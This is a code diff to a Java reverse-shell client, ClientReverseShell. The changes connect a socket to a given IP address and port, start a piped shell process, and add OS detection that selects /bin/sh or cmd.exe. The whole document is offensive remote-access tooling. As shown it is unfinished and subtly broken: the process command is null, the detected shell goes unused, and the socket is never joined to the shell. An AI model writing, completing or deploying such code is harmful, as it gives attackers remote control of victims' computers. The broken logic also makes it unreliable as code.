@@ -10,6 +10,8 @@ import java.net.Socket;
 public class ClientReverseShell {
 
     private InetSocketAddress inetServerSocket;
+    String detectedOs;
+    String detectedShell;
 
     public ClientReverseShell(String ipAddress, int port) {
         this.inetServerSocket = new InetSocketAddress(ipAddress, port);
@@ -65,16 +67,32 @@ public class ClientReverseShell {
 
     private void connect() {
 
-        Process remoteShell;
+        detectOperatingSystem();
 
-        try {
+        try (Socket clientSocket = new Socket();) {
             String prompt = null;
-            Socket client = new Socket();
-            client.connect(inetServerSocket);
-            remoteShell = new ProcessBuilder(prompt).redirectInput(ProcessBuilder.Redirect.PIPE)
+            clientSocket.connect(inetServerSocket);
+            Process remoteShell = new ProcessBuilder(prompt).redirectInput(ProcessBuilder.Redirect.PIPE)
                     .redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
+
         } catch (IOException e) {
             throw new RuntimeException(e);
+        }
+    }
+
+    private void detectOperatingSystem() {
+
+        boolean detected = true;
+        this.detectedOs = System.getProperty("os.name").toUpperCase();
+        if (this.detectedOs.contains("LINUX") || this.detectedOs.contains("MAC")) {
+            this.detectedOs = "LINUX";
+            this.detectedShell = "/bin/sh";
+        } else if (this.detectedOs.contains("WIN")) {
+            this.detectedOs = "WINDOWS";
+            this.detectedShell = "cmd.exe";
+        } else {
+            detected = false;
+            System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
         }
     }
 }
